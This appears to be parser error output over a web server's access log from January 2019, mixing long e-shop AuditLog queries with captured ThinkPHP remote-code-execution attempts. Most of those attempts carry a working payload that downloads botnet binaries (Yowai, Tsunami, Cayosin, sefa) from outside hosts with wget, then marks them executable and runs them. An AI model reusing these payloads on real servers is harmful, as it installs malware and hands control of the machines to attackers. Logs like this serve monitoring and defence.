('91.99.47.57 - - [26/Jan/2019:11:23:44 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28119},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[58075,%2058076,%2058078]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[56859,%2056861,%2056862,%2056863,%2056864,%2056865,%2056869,%2056870,%2056871]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[954457,%20955590,%20957574,%20960622,%20970670,%20974260,%20974528,%20976951,%20979232,%20980426,%20981313,%20981573,%201005522,%201012296,%201027429,%201046376,%201051232,%201056878,%201073922,%201079877,%201083220,%201102750,%201105558,%201105788,%201127268,%201136603,%201164842,%201173746,%201204295,%201215071,%201225045,%201252109,%201294213,%201303792,%201333753,%201346246,%201355742,%201369941,%201450132,%201467929,%201473115,%201497345,%201508158,%201554363,%201554788,%201624440,%201624657,%201624874,%201626776,%201644572,%201645013,%201690555,%201708333,%201766514,%201768456,%201768900,%201769330,%201783584,%201790199,%201815361,%201852050,%201878000,%201878269,%201878541,%201915959,%201935831,%20954459,%20955591,%20957575,%20960623,%20970671,%20974261,%20974529,%20976952,%20979233,%20980427,%20981314,%20981574,%201005523,%201012297,%201027430,%201046377,%201051233,%201056879,%201073923,%201079878,%201083221,%201102751,%201105559,%201105789,%201127269,%201136604,%201164843,%201173747,%201204296,%201215072,%201225046,%201252110,%201277504,%201294214,%201303793,%201333754,%201346489,%201355743,%201369943,%201450134,%201467931,%201473117,%201497347,%201508160,%201554365,%201554790,%201624442,%201624659,%201624876,%201626778,%201644574,%201645015,%201690557,%201708337,%201766516,%201768458,%201768902,%201769332,%201783586,%201790201,%201815363,%201852052,%201878002,%201878271,%201878543,%201915961,%201935833,%20954460,%20955592,%20957576,%20960624,%20970672,%20974262,%20974530,%20976953,%20979234,%20980428,%20981315,%20981575,%201005524,%201012298,%201027431,%201046378,%201051234,%201056880,%201073924,%201079879,%201083222,%201102752,%201105560,%201105790,%201127270,%201136605,%201164844,%201173748,%201204297,%201215073,%201225047,%201252111,%201277505,%201294215,%201303794,%201333755,%201334057,%201341358,%201346371,%201355744,%201369945,%201450136,%201467933,%201473119,%201497349,%201508162,%201554367,%201554792,%201624444,%201624661,%201624878,%201626780,%201644576,%201645017,%201690559,%201708339,%201766518,%201768460,%201768904,%201769336,%201783588,%201790203,%201815365,%201852054,%201878004,%201878273,%201878545,%201915963,%201935835,%20954461,%20955593,%20957577,%20960625,%20970673,%20974263,%20974531,%20976954,%20979235,%20980420,%20981316,%20981576,%201005525,%201012299,%201027432,%201046379,%201051235,%201056881,%201073925,%201079880,%201083223,%201102753,%201105561,%201105791,%201127271,%201136606,%201164845,%201173749,%201204298,%201215074,%201225048,%201252112,%201277506,%201278989,%201294216,%201303795,%201333756,%201333894,%201341359,%201346424,%201355745,%201369947,%201450138,%201467935,%201473121,%201497351,%201508164,%201554369,%201554794,%201624446,%201624663,%201624880,%201626782,%201644578,%201645019,%201690561,%201708343,%201766520,%201768462,%201768906,%201769342,%201783590,%201790205,%201815367,%201852056,%201878006,%201878275,%201878547,%201915965,%201935837,%20954645,%20955594,%20957578,%20960626,%20970674,%20974264,%20974532,%20976955,%20979236,%20980421,%20981317,%20981577,%201005526,%201012300,%201027433,%201046380,%201051236,%201056882,%201073926,%201079881,%201083224,%201102754,%201105562,%201105792,%201127272,%201136607,%201164846,%201173750,%201204299,%201215075,%201225049,%201252113,%201277507,%201278990,%201294217,%201303796,%201333757,%201333895,%201341360,%201346282,%201355746,%201369949,%201450140,%201467937,%201473123,%201497353,%201508166,%201554796,%201624448,%201624665,%201624882,%201626784,%201644580,%201645021,%201690563,%201708347,%201766522,%201768464,%201768908,%201769344,%201783592,%201790207,%201815369,%201852058,%201878008,%201878277,%201878549,%201915967,%201935839,%20954644,%20955595,%20957579,%20960627,%20970675,%20974265,%20974533,%20976956,%20979237,%20980422,%20981318,%20981578,%201005527,%201012301,%201027434,%201046381,%201051237,%201056883,%201073927,%201079882,%201083225,%201102755,%201105563,%201105793,%201127273,%201136608,%201164847,%201173751,%201204300,%201215076,%201225050,%201252114,%201277508,%201278991,%201294218,%201303797,%201333758,%201333896,%201341361,%201346213,%201355747,%201369951,%201450142,%201467939,%201473125,%201497355,%201508168,%201554798,%201624450,%201624667,%201624884,%201626786,%201644582,%201645023,%201690565,%201708351,%201766524,%201768466,%201768910,%201769346,%201783594,%201790209,%201815371,%201852060,%201878010,%201878279,%201878551,%201915969,%201935841,%20954464,%20955599,%20957583,%20960628,%20970676,%20974266,%20974540,%20976957,%20979238,%20980409,%20981319,%20981579,%201005528,%201012302,%201027435,%201046382,%201051238,%201056884,%201073928,%201079883,%201083226,%201102756,%201105564,%201105794,%201127274,%201136609,%201164848,%201173752,%201204301,%201215077,%201225051,%201252115,%201277509,%201278992,%201294219,%201303798,%201333759,%201334013,%201341362,%201346561,%201355748,%201369953,%201450144,%201467941,%201473127,%201497357,%201508170,%201554371,%201554800,%201624452,%201624669,%201624886,%201626788,%201644584,%201645025,%201690567,%201708355,%201766526,%201768468,%201768912,%201769352,%201783596,%201790211,%201815373,%201852062,%201878012,%201878281,%201878553,%201915971,%201935843,%20954642,%20955600,%20957584,%20960629,%20970677,%20974267,%20974541,%20976958,%20979239,%20980410,%20981320,%20981580,%201005529,%201012303,%201046383,%201051239,%201056885,%201073929,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:12:03:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('36.106.21.29 - - [26/Jan/2019:12:33:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86\' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"\n', 'list index out of range')
('91.99.47.57 - - [26/Jan/2019:13:05:58 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:27316},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[54663,%2055707,%2061100]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[55649,%2055650]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[763951,%20779637,%20782958,%20784532,%20784578,%20797832,%20803320,%20803367,%20803413,%20803458,%20803502,%20803545,%20803587,%20803590,%20804302,%20804336,%20804370,%20804404,%20804438,%20804472,%20809277,%20810310,%20811704,%20824383,%20824417,%20824450,%20824482,%20824513,%20824543,%20824572,%20824600,%20824627,%20824653,%20824678,%20824702,%20852837,%20859771,%20861148,%20866239,%20867920,%20873575,%20906068,%20977529,%20977604,%20987103,%20987118,%20992484,%201015075,%201015236,%201018334,%201019561,%201019690,%201020021,%201022229,%201023626,%201027940,%201029796,%201029833,%201029862,%201029890,%201029917,%201029943,%201029968,%201029993,%201031971,%201034823,%201043820,%201043962,%201050123,%201058375,%201065067,%201069941,%201071344,%201077677,%201080949,%201085224,%201090609,%201090736,%201092157,%201098362,%201101426,%201103765,%201106131,%201109467,%201109497,%201119045,%201119092,%201123631,%201124744,%201129640,%201138559,%201139682,%201140990,%201141058,%201141126,%201142400,%201142468,%201142536,%201142604,%201142672,%201143479,%201143547,%201143596,%201143683,%201145713,%201151565,%201151684,%201151685,%201151741,%201151772,%201155866,%201157120,%201157149,%201157541,%201159507,%201159540,%201161074,%201161107,%201165250,%201165283,%201165316,%201166526,%201166559,%201166960,%201173815,%201177623,%201177701,%201177779,%201177857,%201177935,%201184000,%201184077,%201184154,%201184231,%201185412,%201186797,%201188119,%201188187,%201188286,%201188353,%201188577,%201188643,%201188711,%201188776,%201188843,%201188906,%201188971,%201189037,%201189100,%201189165,%201189227,%201189291,%201189352,%201189415,%201189475,%201189537,%201189596,%201189657,%201189715,%201189773,%201189833,%201189890,%201189949,%201190005,%201190063,%201190118,%201190175,%201190231,%201190284,%201190602,%201190654,%201190707,%201190758,%201193817,%201194293,%201194367,%201195723,%201195774,%201197092,%201197170,%201199569,%201199674,%201201128,%201205463,%201205604,%201209123,%201212266,%201216413,%201217593,%201220268,%201227087,%201227563,%201227644,%201230542,%201230622,%201230702,%201231880,%201232724,%201233242,%201235724,%201239555,%201244183,%201250187,%201251498,%201253242,%201255015,%201255101,%201255143,%201258416,%201258457,%201258498,%201258540,%201258580,%201258692,%201259180,%201259220,%201259307,%201259327,%201259380,%201261079,%201266335,%201266344,%201269454,%201271601,%201281319,%201281955,%201281963,%201284376,%201284384,%201285870,%201297325,%201297418,%201297478,%201297568,%201300604,%201301447,%201305410,%201314283,%201318889,%201337836,%201346076,%201354400,%201366629,%201367123,%201395021,%201395654,%201421481,%201432628,%201451741,%201470828,%201471323,%201496571,%201529014,%201539414,%201548713,%201556967,%201557014,%201566785,%201579043,%201592644,%201593163,%201593315,%201595974,%201597675,%201601106,%201601143,%201602196,%201610854,%201628250,%201645519,%201652845,%201664613,%201675372,%201695593,%201695964,%201755648,%201759618,%201763488,%201780178,%201785993,%201802278,%201809730,%201821451,%201833352,%201844913,%201849719,%201853080,%201857891,%201866918,%201873176,%201884274,%201897789,%201897826,%201901597,%201901676,%201901756,%201901836,%201915053,%201919799,%201930840,%201937674,%201942528,%201953733,%201960552,%201960733,%201965101,%201967103,%20763952,%20779638,%20782959,%20784533,%20784579,%20797833,%20803321,%20803368,%20803414,%20803459,%20803503,%20803546,%20803588,%20803629,%20803631,%20804303,%20804337,%20804371,%20804405,%20804439,%20804473,%20809278,%20810311,%20811705,%20824384,%20824418,%20824451,%20824483,%20824514,%20824544,%20824573,%20824601,%20824628,%20824654,%20824679,%20824703,%20852838,%20859772,%20861149,%20866240,%20867921,%20873576,%20906069,%20977530,%20977605,%20987104,%20987119,%20992485,%201015076,%201019562,%201020022,%201022230,%201023627,%201034824,%201043821,%201043963,%201050124,%201058376,%201059102,%201065068,%201069942,%201071345,%201079335,%201080950,%201090610,%201090737,%201092158,%201098363,%201101427,%201106132,%201109468,%201109498,%201119046,%201119093,%201123632,%201124745,%201129641,%201138560,%201139683,%201140991,%201141059,%201141127,%201142401,%201142469,%201142537,%201142605,%201142673,%201143480,%201143548,%201143598,%201143684,%201145714,%201151566,%201151686,%201151687,%201152139,%201157542,%201159508,%201159541,%201161075,%201161108,%201165251,%201165284,%201165317,%201166527,%201166560,%201166961,%201173816,%201177624,%201177702,%201177780,%201177858,%201177936,%201184001,%201184078,%201184155,%201184232,%201185413,%201186798,%201188120,%201188188,%201188287,%201188354,%201188578,%201188644,%201188712,%201188777,%201188844,%201188908,%201188972,%201189038,%201189101,%201189166,%201189228,%201189292,%201189353,%201189416,%201189476,%201189538,%201189597,%201189658,%201189716,%201189774,%201189834,%201189891,%201189950,%201190006,%201190064,%201190119,%201190176,%201190232,%201190285,%201190603,%201190655,%201190708,%201190759,%201193818,%201194294,%201194368,%201195724,%201195776,%201197093,%201197171,%201199570,%201199675,%201201129,%201205464,%201205605,%201209124,%201212267,%201216414,%201217594,%201220269,%201227088,%201227564,%201227645,%201230543,%201230623,%201230703,%201231881,%201233243,%201235302,%201239010,%201239556,%201244184,%201244990,%201245029,%201247818,%201247857,%201247901,%201247932,%201247979,%201248018,%201248054,%201248092,%201248127,%20124816" 414 186 "-" "-" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:13:12:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('83.172.35.53 - - [26/Jan/2019:13:38:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('91.99.47.57 - - [26/Jan/2019:14:06:50 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:27316},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[54663,%2055707,%2061100]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[55649,%2055650]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[763951,%20779637,%20782958,%20784532,%20784578,%20797832,%20803320,%20803367,%20803413,%20803458,%20803502,%20803545,%20803587,%20803590,%20804302,%20804336,%20804370,%20804404,%20804438,%20804472,%20809277,%20810310,%20811704,%20824383,%20824417,%20824450,%20824482,%20824513,%20824543,%20824572,%20824600,%20824627,%20824653,%20824678,%20824702,%20852837,%20859771,%20861148,%20866239,%20867920,%20873575,%20906068,%20977529,%20977604,%20987103,%20987118,%20992484,%201015075,%201015236,%201018334,%201019561,%201019690,%201020021,%201022229,%201023626,%201027940,%201029796,%201029833,%201029862,%201029890,%201029917,%201029943,%201029968,%201029993,%201031971,%201034823,%201043820,%201043962,%201050123,%201058375,%201065067,%201069941,%201071344,%201077677,%201080949,%201085224,%201090609,%201090736,%201092157,%201098362,%201101426,%201103765,%201106131,%201109467,%201109497,%201119045,%201119092,%201123631,%201124744,%201129640,%201138559,%201139682,%201140990,%201141058,%201141126,%201142400,%201142468,%201142536,%201142604,%201142672,%201143479,%201143547,%201143596,%201143683,%201145713,%201151565,%201151684,%201151685,%201151741,%201151772,%201155866,%201157120,%201157149,%201157541,%201159507,%201159540,%201161074,%201161107,%201165250,%201165283,%201165316,%201166526,%201166559,%201166960,%201173815,%201177623,%201177701,%201177779,%201177857,%201177935,%201184000,%201184077,%201184154,%201184231,%201185412,%201186797,%201188119,%201188187,%201188286,%201188353,%201188577,%201188643,%201188711,%201188776,%201188843,%201188906,%201188971,%201189037,%201189100,%201189165,%201189227,%201189291,%201189352,%201189415,%201189475,%201189537,%201189596,%201189657,%201189715,%201189773,%201189833,%201189890,%201189949,%201190005,%201190063,%201190118,%201190175,%201190231,%201190284,%201190602,%201190654,%201190707,%201190758,%201193817,%201194293,%201194367,%201195723,%201195774,%201197092,%201197170,%201199569,%201199674,%201201128,%201205463,%201205604,%201209123,%201212266,%201216413,%201217593,%201220268,%201227087,%201227563,%201227644,%201230542,%201230622,%201230702,%201231880,%201232724,%201233242,%201235724,%201239555,%201244183,%201250187,%201251498,%201253242,%201255015,%201255101,%201255143,%201258416,%201258457,%201258498,%201258540,%201258580,%201258692,%201259180,%201259220,%201259307,%201259327,%201259380,%201261079,%201266335,%201266344,%201269454,%201271601,%201281319,%201281955,%201281963,%201284376,%201284384,%201285870,%201297325,%201297418,%201297478,%201297568,%201300604,%201301447,%201305410,%201314283,%201318889,%201337836,%201346076,%201354400,%201366629,%201367123,%201395021,%201395654,%201421481,%201432628,%201451741,%201470828,%201471323,%201496571,%201529014,%201539414,%201548713,%201556967,%201557014,%201566785,%201579043,%201592644,%201593163,%201593315,%201595974,%201597675,%201601106,%201601143,%201602196,%201610854,%201628250,%201645519,%201652845,%201664613,%201675372,%201695593,%201695964,%201755648,%201759618,%201763488,%201780178,%201785993,%201802278,%201809730,%201821451,%201833352,%201844913,%201849719,%201853080,%201857891,%201866918,%201873176,%201884274,%201897789,%201897826,%201901597,%201901676,%201901756,%201901836,%201915053,%201919799,%201930840,%201937674,%201942528,%201953733,%201960552,%201960733,%201965101,%201967103,%20763952,%20779638,%20782959,%20784533,%20784579,%20797833,%20803321,%20803368,%20803414,%20803459,%20803503,%20803546,%20803588,%20803629,%20803631,%20804303,%20804337,%20804371,%20804405,%20804439,%20804473,%20809278,%20810311,%20811705,%20824384,%20824418,%20824451,%20824483,%20824514,%20824544,%20824573,%20824601,%20824628,%20824654,%20824679,%20824703,%20852838,%20859772,%20861149,%20866240,%20867921,%20873576,%20906069,%20977530,%20977605,%20987104,%20987119,%20992485,%201015076,%201019562,%201020022,%201022230,%201023627,%201034824,%201043821,%201043963,%201050124,%201058376,%201059102,%201065068,%201069942,%201071345,%201079335,%201080950,%201090610,%201090737,%201092158,%201098363,%201101427,%201106132,%201109468,%201109498,%201119046,%201119093,%201123632,%201124745,%201129641,%201138560,%201139683,%201140991,%201141059,%201141127,%201142401,%201142469,%201142537,%201142605,%201142673,%201143480,%201143548,%201143598,%201143684,%201145714,%201151566,%201151686,%201151687,%201152139,%201157542,%201159508,%201159541,%201161075,%201161108,%201165251,%201165284,%201165317,%201166527,%201166560,%201166961,%201173816,%201177624,%201177702,%201177780,%201177858,%201177936,%201184001,%201184078,%201184155,%201184232,%201185413,%201186798,%201188120,%201188188,%201188287,%201188354,%201188578,%201188644,%201188712,%201188777,%201188844,%201188908,%201188972,%201189038,%201189101,%201189166,%201189228,%201189292,%201189353,%201189416,%201189476,%201189538,%201189597,%201189658,%201189716,%201189774,%201189834,%201189891,%201189950,%201190006,%201190064,%201190119,%201190176,%201190232,%201190285,%201190603,%201190655,%201190708,%201190759,%201193818,%201194294,%201194368,%201195724,%201195776,%201197093,%201197171,%201199570,%201199675,%201201129,%201205464,%201205605,%201209124,%201212267,%201216414,%201217594,%201220269,%201227088,%201227564,%201227645,%201230543,%201230623,%201230703,%201231881,%201233243,%201235302,%201239010,%201239556,%201244184,%201244990,%201245029,%201247818,%201247857,%201247901,%201247932,%201247979,%201248018,%201248054,%201248092,%201248127,%20124816" 414 186 "-" "-" "-"\n', 'list index out of range')
('117.198.103.115 - - [26/Jan/2019:14:35:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('125.165.180.211 - - [26/Jan/2019:14:59:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 301 178 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:15:21:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('203.115.99.150 - - [26/Jan/2019:15:26:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('99.100.6.45 - - [26/Jan/2019:17:00:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('92.56.8.28 - - [26/Jan/2019:17:04:42 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
